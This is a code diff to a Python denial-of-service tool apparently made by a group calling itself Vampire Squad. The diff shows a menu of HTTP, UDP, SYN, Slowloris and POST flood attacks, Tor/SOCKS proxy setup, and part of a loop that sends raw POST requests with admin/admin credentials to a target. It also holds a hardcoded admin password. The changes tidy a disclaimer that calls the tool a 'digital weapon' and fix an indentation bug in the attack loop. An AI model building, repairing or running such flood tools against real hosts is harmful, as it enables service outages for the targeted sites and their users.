@@ -21,11 +21,7 @@ install("socks", "pysocks")
 from colorama import Fore, Style, init
 import socks
 
-# Initialize colorama
 init(autoreset=True)
-
-# Import disclaimer
-import disclaimer.py
 
 # Admin Passwords
 ADMIN_PASSWORD = "SH404"
@@ -62,6 +58,27 @@ user_banner = f"""
 ║      Created by: Muhammad Shourov           ║
 ╚══════════════════════════════════════════════╝
 """
+
+def show_disclaimer():
+    disclaimer = f"""
+{Fore.YELLOW}{Style.BRIGHT}
+╔══════════════════════════════════════════════╗
+║           LEGAL & ETHICAL WARNING           ║
+╠══════════════════════════════════════════════╣
+║ This tool is intended for educational,      ║
+║ research, and authorized testing purposes   ║
+║ only. Unauthorized use against targets      ║
+║ without explicit permission is illegal and  ║
+║ strictly prohibited under international law.║
+║                                             ║
+║ By proceeding, you confirm you are a        ║
+║ certified tester or acting with full        ║
+║ authorization. Misuse can lead to legal     ║
+║ consequences. Vampire Squad is not liable.  ║
+╚══════════════════════════════════════════════╝
+{Style.RESET_ALL}
+"""
+    print(disclaimer)
 
 def install_tor():
     try:
@@ -109,7 +126,7 @@ def attack(target, port, attack_type):
                         payload = "username=admin&password=admin"
                         headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload}"
                         s.send(headers.encode())
-                    s.close()
+                s.close()
                 requests_sent += 1
             except:
                 continue
@@ -124,59 +141,7 @@ def show_stats():
 def main():
     print(f"{Fore.CYAN}[?] Enter Mode (admin/user): {Style.RESET_ALL}", end='')
     mode = input().strip().lower()
-
-    # Show disclaimer first
-    def terminal_shake():
-    for _ in range(10):
-        os.system("clear")
-        print(" " * random.randint(1, 10), end="")
-        print(Fore.RED + Style.BRIGHT + "!! WARNING !!")
-        time.sleep(0.05)
-
-def play_warning_sound():
-    try:
-        os.system("termux-media-player play warning.mp3")  # Ensure 'warning.mp3' is present
-    except:
-        pass  # Silent fail if media not available
-
-def blood_drip_effect():
-    blood = Fore.RED + Style.BRIGHT + "☠ BLOOD DRIPPING... ☠"
-    for _ in range(3):
-        print("\n" * random.randint(1, 3) + " " * random.randint(1, 5) + blood)
-        time.sleep(0.2)
-
-def show_disclaimer():
-    terminal_shake()
-    play_warning_sound()
-    blood_drip_effect()
-
-    disclaimer = f"""
-{Fore.RED}{Style.BRIGHT}
-⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀     {Fore.LIGHTRED_EX}██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗███████╗
-⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀     ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔════╝
-⠀⠀⠀⠀⣿⣿⡟⠛⠛⠛⠛⠛⠻⣿⣿⡇⠀⠀⠀⠀     ██║   ██║███████║██╔████╔██║██████╔╝██║███████╗
-⠀⠀⠀⠀⠹⣿⣷⣶⣶⣶⣶⣾⣿⡿⠏⠀⠀⠀⠀     ██║   ██║██╔══██║██║╚██╔╝██║██╔═══╝ ██║╚════██║
-⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║     ██║███████║
-                                                       ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
-{Fore.LIGHTYELLOW_EX}
-╔════════════════════════════════════════════════════════════════╗
-║                   {Fore.RED}!!! WARNING !!!                    {Fore.LIGHTYELLOW_EX}               ║
-╠════════════════════════════════════════════════════════════════╣
-║ {Fore.LIGHTWHITE_EX}This tool is a digital weapon and can cause harm if misused!   {Fore.LIGHTYELLOW_EX}║
-║ {Fore.RED}Only ethical hackers, security researchers, or authorized users {Fore.LIGHTYELLOW_EX}║
-║ {Fore.RED}are allowed to use this tool. Unauthorized usage is ILLEGAL.   {Fore.LIGHTYELLOW_EX}║
-╠════════════════════════════════════════════════════════════════╣
-║ {Fore.CYAN}Author : {Fore.LIGHTWHITE_EX}Muhammad Shourov (VAMPIRE)                      {Fore.LIGHTYELLOW_EX}║
-║ {Fore.CYAN}Team   : {Fore.LIGHTWHITE_EX}Vampire Squad (Ethical Hackers Organization)        {Fore.LIGHTYELLOW_EX}║
-║ {Fore.CYAN}GitHub : {Fore.LIGHTWHITE_EX}https://github.com/vampiresquad                      {Fore.LIGHTYELLOW_EX}║
-╠════════════════════════════════════════════════════════════════╣
-║ {Fore.LIGHTRED_EX}We (Vampire Squad) are not responsible for any misuse or damage.║
-║ Use this tool only with full responsibility and legal access!   {Fore.LIGHTYELLOW_EX}║
-╚════════════════════════════════════════════════════════════════╝
-
-{Style.RESET_ALL}
-"""
+    show_disclaimer()
 
     if mode == "admin":
         pw = getpass.getpass("Enter Admin Password: ")
@@ -205,12 +170,11 @@ def show_disclaimer():
 
     print("""
 [?] Select Attack Type:
-
-1.  HTTP Flood
-2.  UDP Flood
-3.  SYN Flood
-4.  Slowloris
-5.  POST Flood
+1. HTTP Flood
+2. UDP Flood
+3. SYN Flood
+4. Slowloris
+5. POST Flood
 """)
     attack_type = input("[+] Choice: ").strip()
     if attack_type not in ["1", "2", "3", "4", "5"]:
